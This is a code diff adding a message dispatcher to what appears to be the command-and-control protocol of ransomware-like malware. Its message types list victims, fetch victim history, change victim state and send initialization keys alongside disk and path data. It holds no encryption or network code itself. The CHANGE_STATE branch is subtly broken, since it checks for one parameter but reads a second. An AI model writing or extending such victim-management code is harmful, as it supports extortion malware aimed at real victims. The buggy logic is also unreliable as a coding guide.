@@ -123,3 +123,50 @@ def initialize_resp(id, disks, paths, file_exit, freq, key, state):
 
     return irjson
 
+def get_message(select_msg, params=None):
+
+    if select_msg.upper() == 'LIST_VICTIM_REQ':
+        return list_victim_req()
+
+    if select_msg.upper() == 'LIST_VICTIM_RESP':
+        if len(params) != 6:
+            return None
+        return list_victim_resp(params[0], params[1], params[2], params[3], params[4], params[5])
+
+    if select_msg.upper() == 'LIST_VICTIM_END':
+        return list_victim_end()
+
+    if select_msg.upper() == 'HISTORY_REQ':
+        if len(params) != 1:
+            return None
+        return history_req(params[0])
+
+    if select_msg.upper() == 'HISTORY_RESP':
+        if len(params) != 4:
+            return None
+        return history_resp(params[0], params[1], params[2], params[3])
+
+    if select_msg.upper() == 'HISTORY_END':
+        if len(params) != 1:
+            return None
+        return history_end(params[0])
+
+    if select_msg.upper() == 'CHANGE_STATE':
+        if len(params) != 1:
+            return None
+        return change_state(params[0], params[1])
+
+    if select_msg.upper() == 'INITIALIZE_REQ':
+        if len(params) != 3:
+            return None
+        return initialize_req(params[0], params[1], params[2])
+
+    if select_msg.upper() == 'INITIALIZE_KEY':
+        if len(params) != 3:
+            return None
+        return initialize_key(params[0], params[1], params[2])
+
+    if select_msg.upper() == 'INITIALIZE_RESP':
+        if len(params) != 6:
+            return None
+        return initialize_resp(params[0], params[1], params[2], params[3], params[4], params[5])
